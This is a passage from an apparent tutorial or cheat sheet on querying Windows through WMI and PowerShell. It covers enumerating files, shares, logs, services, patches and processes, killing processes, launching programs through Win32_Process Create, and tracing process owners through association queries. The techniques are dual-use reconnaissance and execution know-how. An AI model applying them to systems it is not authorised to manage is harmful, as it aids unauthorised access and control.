&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List files and folders:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Files&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">CIM_DataFile&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Shared folders&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Share&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Local folders&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Directory&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get security logs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_NTEventLogFile&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get networking configuration:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_NetworkAdapter&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_NetworkAdapterConfiguration&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List services:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Service&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List scheduled tasks:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_ScheduledJob&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List installed patches:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="s2">&amp;#34;__Namespace&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_QuickFixEngineering&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List processes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_ProcessStartup&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Format-List&lt;/span> &lt;span class="n">-Property&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="interacting-with-wmi-objects">Interacting with WMI objects&lt;/h3>
&lt;h4 id="removing-objects">Removing objects&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Name&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;notepad.exe&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Remove-WmiObject&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Name&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;notepad.exe&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Remove-CimInstance&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="list-class-methods">List class methods&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="n">-List&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">Methods&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">CimClassMethods&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">CimClassMethods&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">where &lt;/span>&lt;span class="n">name&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;Create&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">Parameters&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get owner for each active process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">win32_process&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ForEach-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$output&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Invoke-CimMethod&lt;/span> &lt;span class="n">-InputObject&lt;/span> &lt;span class="nv">$_&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">getowner&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="s2">&amp;#34;PROCESS: &amp;#34;&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="s2">&amp;#34; - OWNER: &amp;#34;&lt;/span>&lt;span class="nv">$output&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="list-classes-which-contains-methods">List classes which contains methods&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-List&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">where-object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Methods&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-MethodName&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-MethodName&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">create&lt;/span>&lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List all methods create in all namespaces namespaces&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="s2">&amp;#34;__Namespace&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ForEach-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$name&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="n">-MethodName&lt;/span> &lt;span class="n">create&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="invoke-class-methods">Invoke class methods&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">Create&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">calc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-CimMethod&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">Create&lt;/span> &lt;span class="n">-Arguments&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">CommandLine&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="update-properties-of-a-wmi-object">Update properties of a WMI Object&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s2">&amp;#34;Name = &amp;#39;notepad.exe&amp;#39;&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Set-WmiInstance&lt;/span> &lt;span class="n">-Arguments&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">Comment&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Notepad test&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Process&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s2">&amp;#34;Name = &amp;#39;notepad.exe&amp;#39;&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Set-CimInstance&lt;/span> &lt;span class="n">-Arguments&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">Comment&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Notepad test&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="wmi-associations">WMI Associations&lt;/h3>
&lt;p>There are relations between WMI classes which can be used to retrieve information about a managed object which is not available from a single class.
The following command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_NetworkAdapter.DeviceID=11}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimAssociatedInstance&lt;/span> &lt;span class="n">-InputObject&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_NetworkAdapter&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;DeviceId = 11&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>gives much more information about the object than the simple command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_NetworkAdapter&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;DeviceId = 11&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_NetworkAdapter&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;DeviceId = 11&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>in fact the first one also gives instances related to all the associated classes.&lt;/p>
&lt;p>The &lt;strong>Associators of&lt;/strong> statement retrieves all instances that are associated with a particular source instance. The instances that are retrieved are referred to as the endpoints. Each endpoint is returned as many times as there are associations between it and the source object.&lt;/p>
&lt;p>Get all association types relative to a particular class:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;References of {Win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all association types:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Qualifier&lt;/span> &lt;span class="s2">&amp;#34;Association&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">binding&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="n">-Qualifier&lt;/span> &lt;span class="s2">&amp;#34;Association&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;strong>References of&lt;/strong> statement retrieves all association instances that refer to a particular source instance. The &amp;ldquo;References of&amp;rdquo; statement is similar to the &amp;ldquo;Associators of&amp;rdquo; statement in its syntax. However, rather than retrieving endpoint instances, it retrieves the intervening association instances.&lt;/p>
&lt;p>Retrieve only instances associated with an association type (returned by the previous command):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_NetworkAdapter.DeviceID=11} Where AssocClass=Win32_SystemDevices&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimAssociatedInstance&lt;/span> &lt;span class="n">-InputObject&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_NetworkAdapter&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;DeviceId = 11&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Associations&lt;/span> &lt;span class="n">Win32_SystemDevices&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Retrieve only instances associated with an associated class type:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;References of {Win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_NetworkAdapter.DeviceID=11} Where ResultClass=Win32_NetworkAdapterConfiguration&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;References of {Win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimAssociatedInstance&lt;/span> &lt;span class="n">-InputObject&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_NetworkAdapter&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;DeviceId = 11&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-ResultClass&lt;/span> &lt;span class="n">Win32_NetworkAdapterConfiguration&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List process owners:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root/cimv2&amp;#34;&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_Process=13920} Where ClassDefsOnly&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_Process=13920} Where ResultClass=Win32_LogonSession&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_LogonSession=720560} Where ClassDefsOnly&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_LogonSession=720560} where ResultClass=Win32_Account&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>which can be also rewritten as:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$PROCESS_ID&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">13920&lt;/span> &lt;span class="c"># PROCESS ID (PID)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$QUERY_1&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_Process=&amp;#34;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$PROCESS_ID&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s2">&amp;#34;} Where ResultClass=Win32_LogonSession&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$LOGON_ID&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="nv">$QUERY_1&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">LogonId&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$QUERY_2&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_LogonSession=&amp;#34;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$LOGON_ID&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s2">&amp;#34;} where ResultClass=Win32_Account&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="nv">$QUERY_2&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Name&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List owners of all the files on the desktop:&lt;/p>
